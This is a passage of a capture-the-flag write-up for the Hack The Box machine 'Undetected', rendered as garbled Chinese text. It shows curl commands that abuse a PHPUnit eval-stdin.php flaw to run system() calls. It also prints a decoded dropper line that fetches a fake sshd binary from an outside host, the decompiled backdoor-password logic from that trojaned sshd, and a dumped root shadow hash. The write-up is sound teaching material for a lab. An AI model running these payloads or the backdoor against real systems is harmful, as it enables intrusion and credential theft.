80FAcdZ171847;<br/>        Sun, 25 Jul 2021 10:31:12 GMT<br/>Date: Sun, 25 Jul 2021 10:31:12 GMT<br/>Message-Id: &lt;202107251031.80FAcdZ171847@production&gt;<br/>To: steven@production<br/>From: root@production<br/>Subject: Investigations<br/><br/>Hi Steven.<br/><br/>We recently updated the system but are still experiencing some strange behaviour with the Apache service. We have temporarily moved the web store and database to another server whilst investigations are underway. If for any reason you need access to the database or web application code, get in touch with Mark and he will generate a temporary password for you to authenticate to the temporary server.<br/><br/>Thanks,<br/>sysadmin</span></pre><h1 id="b10a" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">å¯ç–‘çš„Apacheæ¨¡å—</h1><p id="b1e4" class="pw-post-body-paragraph lj lk iq ll b lm my jr lo lp mz ju lr ls na lu lv lw nb ly lz ma nc mc md me ij bi translated">è¿™é‡Œæœ‰ä¸€ä¸ªå…³äºè¡Œä¸ºä¸ç«¯çš„ApacheæœåŠ¡çš„çº¿ç´¢ã€‚åœ¨æ¨¡å—æ–‡ä»¶å¤¹ä¸­ï¼Œæˆ‘æ³¨æ„åˆ°è¿™ä¸ªçœ‹èµ·æ¥å¾ˆå¥‡æ€ª:</p><figure class="ky kz la lb gt lc gh gi paragraph-image"><div role="button" tabindex="0" class="ne nf di ng bf nh"><div class="gh gi nx"><img src="../Images/99c99c5a6c311b458d2b004c1e32d2c6.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*YTifoJEfVc-KQ0DskKeF0w.png"/></div></div><figcaption class="lf lg gj gh gi lh li bd b be z dk translated">å®‰è£…çš„apacheæ¨¡å—åˆ—è¡¨</figcaption></figure><p id="6b6f" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">ä¸€ä¸ªæ—¶é—´æˆ³ä¸å…¶ä»–æ–‡ä»¶ä¸åŒçš„modæ–‡ä»¶ã€‚æ£€æŸ¥<a class="ae mf" href="https://packages.debian.org/sid/amd64/apache2-bin/filelist" rel="noopener ugc nofollow" target="_blank"> Debianè½¯ä»¶åŒ…æ–‡ä»¶åˆ—è¡¨</a>æˆ‘å¯ä»¥çœ‹åˆ°è¯¥æ–‡ä»¶ä¸æ˜¯æ ‡å‡†å‘è¡Œç‰ˆçš„ä¸€éƒ¨åˆ†:</p><pre class="ky kz la lb gt nj nk nl nm aw nn bi"><span id="4de0" class="no kg iq nk b gy np nq l nr ns">/usr/lib/apache2/modules/mod_ratelimit.so<br/>/usr/lib/apache2/modules/mod_reflector.so<br/>/usr/lib/apache2/modules/mod_remoteip.so<br/>/usr/lib/apache2/modules/mod_reqtimeout.so<br/>/usr/lib/apache2/modules/mod_request.so<br/>/usr/lib/apache2/modules/mod_rewrite.so</span></pre><p id="b59c" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">æ‰€ä»¥mod_reader.soå€¼å¾—ä¸€çœ‹ï¼Œæˆ‘ä»¬æŠŠå®ƒæ‹‰åˆ°Kali:</p><pre class="ky kz la lb gt nj nk nl nm aw nn bi"><span id="3946" class="no kg iq nk b gy np nq l nr ns">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/undetected]<br/>â””â”€# curl --data "&lt;?php system('cat /usr/lib/apache2/modules/mod_reader.so');" http://store.djewelry.htb/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php --output mod_reader.so</span></pre><h1 id="eb0f" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">ä¸Ghidraä¸€èµ·å€’è½¦</h1><p id="6e85" class="pw-post-body-paragraph lj lk iq ll b lm my jr lo lp mz ju lr ls na lu lv lw nb ly lz ma nc mc md me ij bi translated">æ˜¯æ—¶å€™å¯åŠ¨Ghidraå¹¶åœ¨æ–‡ä»¶ä¸­æ¢ç´¢ä¸€ä¸‹äº†ã€‚å¦‚æœä½ ä¸ç¡®å®šå¦‚ä½•ä½¿ç”¨Ghidraï¼Œè¿™é‡Œçš„æ˜¯ä¸€ä¸ªæœ‰ç”¨çš„å¸–å­ã€‚</p><p id="ffbf" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">æˆ‘è¿˜æ²¡æœ‰æŠŠå®ƒå®‰è£…åœ¨è¿™å°è™šæ‹Ÿæœºä¸Šï¼Œä½†åœ¨æ·»åŠ ä¹‹å‰ï¼Œè¯·æ³¨æ„è¿™éœ€è¦å¤§çº¦800mbçš„ç©ºé—´æ¥å®‰è£…:</p><pre class="ky kz la lb gt nj nk nl nm aw nn bi"><span id="73dc" class="no kg iq nk b gy np nq l nr ns">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/undetected]<br/>â””â”€# apt install ghidra        <br/>Reading package lists... Done<br/>Building dependency tree... Done<br/>Reading state information... Done<br/>The following additional packages will be installed:<br/>  ghidra-data openjdk-11-jdk-headless openjdk-11-jre openjdk-11-jre-headless<br/>The following NEW packages will be installed:<br/>  ghidra ghidra-data openjdk-11-jdk-headless<br/>The following packages will be upgraded:<br/>  openjdk-11-jre openjdk-11-jre-headless<br/>2 upgraded, 3 newly installed, 0 to remove and 587 not upgraded.<br/>Need to get 613 MB of archives.<br/>After this operation, 1,282 MB of additional disk space will be used.<br/>Do you want to continue? [Y/n] y<br/>Get:1 https://http.kali.org/kali kali-rolling/main amd64 openjdk-11-jre amd64 11.0.14+9-1 [175 kB]<br/>Get:2 https://http.kali.org/kali kali-rolling/main amd64 openjdk-11-jre-headless amd64 11.0.14+9-1 [37.3 MB]<br/>Get:3 https://http.kali.org/kali kali-rolling/main amd64 openjdk-11-jdk-headless amd64 11.0.14+9-1 [214 MB]<br/>Get:4 https://archive-4.kali.org/kali kali-rolling/main amd64 ghidra amd64 10.1.2-0kali2 [282 MB]<br/>Get:5 https://archive-4.kali.org/kali kali-rolling/main amd64 ghidra-data all 9.2-0kali2 [79.1 MB]<br/>Fetched 613 MB in 15min 39s (653 kB/s)<br/>(Reading database ... 300882 files and directories currently installed.)<br/>Preparing to unpack .../openjdk-11-jre_11.0.14+9-1_amd64.deb ...<br/>&lt;SNIP&gt;<br/>Setting up ghidra-data (9.2-0kali2) ...<br/>Setting up ghidra (10.1.2-0kali2) ...<br/>Processing triggers for kali-menu (2021.4.2) ...<br/>Processing triggers for desktop-file-utils (0.26-1) ...<br/>Processing triggers for hicolor-icon-theme (0.17-2) ...<br/>Processing triggers for mailcap (3.70+nmu1) ...</span></pre><p id="1e45" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">å®‰è£…å®Œæˆåï¼Œåªéœ€åœ¨æ§åˆ¶å°ä¸­é”®å…¥ghidraå³å¯å¯åŠ¨GUIã€‚åˆ›å»ºä¸€ä¸ªæ–°é¡¹ç›®å¹¶å¯¼å…¥mod_reader.soæ–‡ä»¶:</p><figure class="ky kz la lb gt lc gh gi paragraph-image"><div role="button" tabindex="0" class="ne nf di ng bf nh"><div class="gh gi ny"><img src="../Images/ec7760db8e25ec6323d54496bb516bf8.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*8B9W_ebVDF4nyzg5.png"/></div></div><figcaption class="lf lg gj gh gi lh li bd b be z dk translated">ç”¨Ghidraçœ‹mod_reader.so</figcaption></figure><p id="1d06" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">ç¯é¡¾å››å‘¨ï¼Œæˆ‘å‘ç°äº†ä¸€ä¸ªåä¸ºhook_post_configçš„å‡½æ•°ï¼Œå®ƒåŒ…å«ä¸€äº›base64:</p><figure class="ky kz la lb gt lc gh gi paragraph-image"><div role="button" tabindex="0" class="ne nf di ng bf nh"><div class="gh gi nz"><img src="../Images/0a54e3237b12b9b1246bec0304c31c21.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*2mtgJE28iJ57z8Fl.png"/></div></div><figcaption class="lf lg gj gh gi lh li bd b be z dk translated">ä½¿ç”¨GhidraæŸ¥çœ‹host_post_config</figcaption></figure><h1 id="1a71" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">Base64è§£ç </h1><p id="64b4" class="pw-post-body-paragraph lj lk iq ll b lm my jr lo lp mz ju lr ls na lu lv lw nb ly lz ma nc mc md me ij bi translated">å¤åˆ¶å¹¶è§£ç åæˆ‘ä»¬å‘ç°äº†ä¸€äº›æœ‰è¶£çš„ä¸œè¥¿:</p><pre class="ky kz la lb gt nj nk nl nm aw nn bi"><span id="e50d" class="no kg iq nk b gy np nq l nr ns">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/undetected]<br/>â””â”€# echo "d2dldCBzaGFyZWZpbGVzLnh5ei9pbWFnZS5qcGVnIC1PIC91c3Ivc2Jpbi9zc2hkOyB0b3VjaCAtZCBgZGF0 ZSArJVktJW0tJWQgLXIgL3Vzci9zYmluL2EyZW5tb2RgIC91c3Ivc2Jpbi9zc2hk" | base64 -d<br/><br/>wget sharefiles.xyz/image.jpeg -O /usr/sbin/sshd; touch -d `datbase64: invalid input</span></pre><p id="5113" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">å¥½åƒæ˜¯åœ¨sbiné‡ŒæŠŠä¸€å¼ å›¾ç‰‡å†™æˆsshdå®ˆæŠ¤è¿›ç¨‹äº†ã€‚ä¸ºä»€ä¹ˆä¼šè¿™æ ·ï¼Ÿ</p><h1 id="1c35" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">å¯ç–‘çš„sshdæ–‡ä»¶</h1><p id="0cb2" class="pw-post-body-paragraph lj lk iq ll b lm my jr lo lp mz ju lr ls na lu lv lw nb ly lz ma nc mc md me ij bi translated">è®©æˆ‘ä»¬è·å–sshdæ–‡ä»¶ï¼Œå¹¶åœ¨Kaliä¸ŠæŸ¥çœ‹å®ƒ:</p><pre class="ky kz la lb gt nj nk nl nm aw nn bi"><span id="1758" class="no kg iq nk b gy np nq l nr ns">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/undetected]<br/>â””â”€# curl --data "&lt;?php system('cat /usr/sbin/sshd');" http://store.djewelry.htb/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php --output sshd</span></pre><p id="4372" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">æ‰§è¡Œè¯¥æ–‡ä»¶å‘æˆ‘ä»¬å±•ç¤ºäº†å®ƒçœ‹èµ·æ¥æ˜¯ä¸€ä¸ªæ™®é€šçš„sshdäºŒè¿›åˆ¶æ–‡ä»¶:</p><pre class="ky kz la lb gt nj nk nl nm aw nn bi"><span id="a7c5" class="no kg iq nk b gy np nq l nr ns">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/undetected]<br/>â””â”€# ./sshd --help<br/>unknown option -- -<br/>OpenSSH_8.2p1, OpenSSL 1.1.1m  14 Dec 2021<br/>usage: sshd [-46DdeiqTt] [-C connection_spec] [-c host_cert_file]<br/>            [-E log_file] [-f config_file] [-g login_grace_time]<br/>            [-h host_key_file] [-o option] [-p port] [-u len]</span></pre><p id="b04a" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">8.2ç‰ˆæœ¬äº2020å¹´2æœˆ14æ—¥å‘å¸ƒï¼Œä½†æˆ‘æ²¡æœ‰å‘ç°ä»»ä½•å®¹æ˜“å°è¯•å’Œåˆ©ç”¨çš„æ¼æ´ã€‚</p><h1 id="3e3e" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">åˆå’Œå‰å¾·æ‹‰å€’è½¦äº†</h1><p id="b52f" class="pw-post-body-paragraph lj lk iq ll b lm my jr lo lp mz ju lr ls na lu lv lw nb ly lz ma nc mc md me ij bi translated">å°†è¿™ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶å¯¼å…¥åˆ°Ghidraåï¼Œæˆ‘å‘ç°äº†ä¸€äº›æœ‰è¶£çš„ä¸œè¥¿:</p><figure class="ky kz la lb gt lc gh gi paragraph-image"><div role="button" tabindex="0" class="ne nf di ng bf nh"><div class="gh gi oa"><img src="../Images/712e3ea1e7a9ddb1dd273eba2dc2f6c7.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*9f3IyGrq6wr9Q04S.png"/></div></div><figcaption class="lf lg gj gh gi lh li bd b be z dk translated">ç”¨Ghidraçœ‹sshd</figcaption></figure><p id="10a5" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">auth_passwordå‡½æ•°æœ‰ä¸€ä¸ªå˜é‡å«åšbackdoorã€‚åœ¨è¿™é‡ŒæŸ¥çœ‹å‡½æ•°<a class="ae mf" href="https://github.com/openssh/openssh-portable/blob/master/auth-passwd.c" rel="noopener ugc nofollow" target="_blank">çš„å®˜æ–¹æºä»£ç </a>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°å®ƒè¢«ä¿®æ”¹äº†ã€‚</p><p id="de97" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">æˆ‘ä¸ä¼šè¯¦ç»†è¯´æ˜å¦‚ä½•è®¡ç®—å‡ºæ·»åŠ çš„åé—¨ä»£ç çš„ä½œç”¨ã€‚ä¸»è¦å…³æ³¨çš„æ˜¯å¼€å§‹æ—¶è¢«èµ‹å€¼çš„å˜é‡:</p><pre class="ky kz la lb gt nj nk nl nm aw nn bi"><span id="0bd4" class="no kg iq nk b gy np nq l nr ns">char backdoor [31];<br/>backdoor[30] = -0x5b;<br/>backdoor._28_2_ = 0xa9f4;<br/>backdoor._24_4_ = 0xbcf0b5e3;<br/>backdoor._16_8_ = 0xb2d6f4a0fda0b3d6;<br/>backdoor._12_4_ = 0xfdb3d6e7;<br/>backdoor._8_4_ = 0xf7bbfdc8;<br/>backdoor._4_4_ = 0xa4b3a3f3;<br/>backdoor._0_4_ = 0xf0e7abd6;<br/>bVar7 = 0xd6;<br/>pbVar4 = (byte *)backdoor;</span></pre><p id="a3ca" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">å˜é‡åé—¨æ˜¯ç”¨31ä¸ªå­—èŠ‚åˆ›å»ºçš„ã€‚ç„¶åå°ç«¯æ ¼å¼çš„åå…­è¿›åˆ¶å€¼å­˜å‚¨åœ¨å…¶ä¸­ã€‚æˆ‘å·²ç»é‡æ–°å®‰æ’äº†é¡ºåºï¼Œæ‰€ä»¥å®ƒæ˜¯é™åºçš„ï¼Œè¿˜è¦æ³¨æ„åé—¨[30]æ˜¯ä¸€ä¸ªæ— æ•ˆå€¼-0x5bï¼Œå¦‚æœä½ åœ¨Ghidraä¸­å³é”®å•å‡»å®ƒï¼Œä½ ä¼šçœ‹åˆ°æ­£ç¡®çš„å€¼æ˜¯0xa5ã€‚</p><p id="16ac" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">æ¥ä¸‹æ¥æ˜¯ä¸€ä¸ªéå†pbVar4çš„å¾ªç¯ï¼Œå®ƒåŒ…å«æ‰€æœ‰æ·»åŠ åˆ°åé—¨çš„åå…­è¿›åˆ¶å€¼çš„ç»“æœ:</p><pre class="ky kz la lb gt nj nk nl nm aw nn bi"><span id="ed03" class="no kg iq nk b gy np nq l nr ns">while( true ) {<br/>    pbVar5 = pbVar4 + 1;<br/>    *pbVar4 = bVar7 ^ 0x96;<br/>    if (pbVar5 == local_39) break;<br/>    bVar7 = *pbVar5;<br/>    pbVar4 = pbVar5;<br/>}<br/><br/>iVar2 = strcmp(password,backdoor);</span></pre><p id="d2a7" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">åœ¨æ¯æ¬¡å¾ªç¯ä¸­ï¼Œè¿™äº›å€¼éƒ½ä¸é•¿åº¦ä¸º96çš„å¯†é’¥è¿›è¡Œxorè¿ç®—ï¼Œç„¶åè¿›è¡Œä¸€æ¬¡stingæ¯”è¾ƒï¼Œçœ‹æ‚¨åœ¨ç™»å½•SSHæ—¶è¾“å…¥çš„å¯†ç æ˜¯å¦ä¸backdoorçš„å€¼åŒ¹é…ã€‚è¿™å¾ˆéš¾ç†è§£ï¼Œå› ä¸ºæœ‰äººæ•…æ„é€šè¿‡ç§»åŠ¨å˜é‡çš„å€¼æ¥æ··æ·†æˆ‘ä»¬ã€‚<a class="ae mf" href="https://en.cppreference.com/w/c/language/operator_precedence" rel="noopener ugc nofollow" target="_blank">è¿™ä¸ª</a>å¯¹äºCæ“ä½œäººå‘˜æ¥è¯´æ˜¯ä¸€ä¸ªå¾ˆå¥½çš„å‚è€ƒã€‚</p><h1 id="d490" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">è§£ç æ ¹å¯†ç </h1><p id="88eb" class="pw-post-body-paragraph lj lk iq ll b lm my jr lo lp mz ju lr ls na lu lv lw nb ly lz ma nc mc md me ij bi translated">è¦æŸ¥çœ‹åé—¨å˜é‡æŒæœ‰çš„å¯†ç æ˜¯ä»€ä¹ˆï¼Œæˆ‘ä»¬éœ€è¦è§£ç ä¸Šé¢çš„å†…å®¹ã€‚è¿™å¯ä»¥ç”¨ä¸€ä¸ªç®€å•çš„Pythonå¾ªç¯æ¥å®Œæˆï¼Œä½†ä½¿ç”¨CyberChefæ›´å®¹æ˜“:</p><figure class="ky kz la lb gt lc gh gi paragraph-image"><div role="button" tabindex="0" class="ne nf di ng bf nh"><div class="gh gi ob"><img src="../Images/0c8be33dfab94a6c907cb7f94defffd3.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*4EhyZLnJO51eMtfV.png"/></div></div><figcaption class="lf lg gj gh gi lh li bd b be z dk translated">ä½¿ç”¨CyberChefæŸ¥æ‰¾æ ¹å¯†ç </figcaption></figure><p id="952b" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">å°±åƒåœ¨å‡½æ•°ä¸­ä¸€æ ·ï¼Œæˆ‘ä»¬å°†åé—¨ç¨‹åºçš„å†…å®¹ä»Little Endianè½¬æ¢ä¸ºHexï¼Œç„¶åè¿›è¡ŒXORè¿ç®—ã€‚ç»“æœæ˜¯æ ¹å¯†ç ï¼Œæ‰€ä»¥è®©æˆ‘ä»¬ç™»å½•å¹¶å®Œæˆæ¡†:</p><pre class="ky kz la lb gt nj nk nl nm aw nn bi"><span id="5ba7" class="no kg iq nk b gy np nq l nr ns">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/undetected]<br/>â””â”€# ssh root@djewelry.htb<br/>root@djewelry.htbs password: <br/>Last login: Tue Feb 22 19:43:08 2022 from 10.10.14.193<br/>root@production:~#<br/>root@production:~# cat /root/root.txt<br/>3a931f64fcdcfb18217aeb6bd37ad8d9<br/><br/>root@production:~# cat /etc/shadow<br/>root:$6$xxydXHZzlPY4U0lU$qJDDFjfkXQnhUcESjCaoCWjMT9gAPnyCLJ8U5l2KSlOO3hPMUVxAOUZwvcm87Vkz0Vyc./cDsb2nNZT0dYIbv.:19031:0:99999:7:::</span></pre><p id="ddb0" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">å®Œæˆäº†ã€‚ä¸‹æ¬¡è§ã€‚</p></div><div class="ab cl oc od hu oe" role="separator"><span class="of bw bk og oh oi"/><span class="of bw bk og oh oi"/><span class="of bw bk og oh"/></div><div class="ij ik il im in"><p id="2982" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">å¦‚æœä½ å–œæ¬¢è¿™ç¯‡æ–‡ç« ï¼Œè¯·ç»™æˆ‘ä¸€ä¸¤ä¸ªæŒå£°(è¿™æ˜¯å…è´¹çš„ï¼)</p><p id="350e" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">æ¨ç‰¹â€”ã€https://twitter.com/pencer_ioã€‘T4<br/>ç½‘ç«™â€” <a class="ae mf" href="https://pencer.io/" rel="noopener ugc nofollow" target="_blank"> https://pencer.io </a></p><p id="80d9" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated"><em class="oj">åŸè½½äº2022å¹´7æœˆ2æ—¥</em><a class="ae mf" href="https://pencer.io/ctf/ctf-htb-undetected/" rel="noopener ugc nofollow" target="_blank"><em class="oj">https://pencer . io</em></a><em class="oj">ã€‚</em></p></div></div>    
</body>
</html>